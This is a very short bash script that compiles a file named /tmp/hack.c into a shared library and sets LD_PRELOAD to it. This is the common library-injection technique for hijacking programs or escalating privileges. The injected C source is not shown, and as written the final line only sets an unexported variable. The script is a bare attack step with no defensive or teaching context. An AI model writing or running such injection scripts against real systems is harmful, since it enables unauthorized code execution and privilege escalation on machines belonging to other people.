#!/bin/bash
gcc -shared -o /tmp/hack.so -fPIC /tmp/hack.c
LD_PRELOAD=/tmp/hack.so
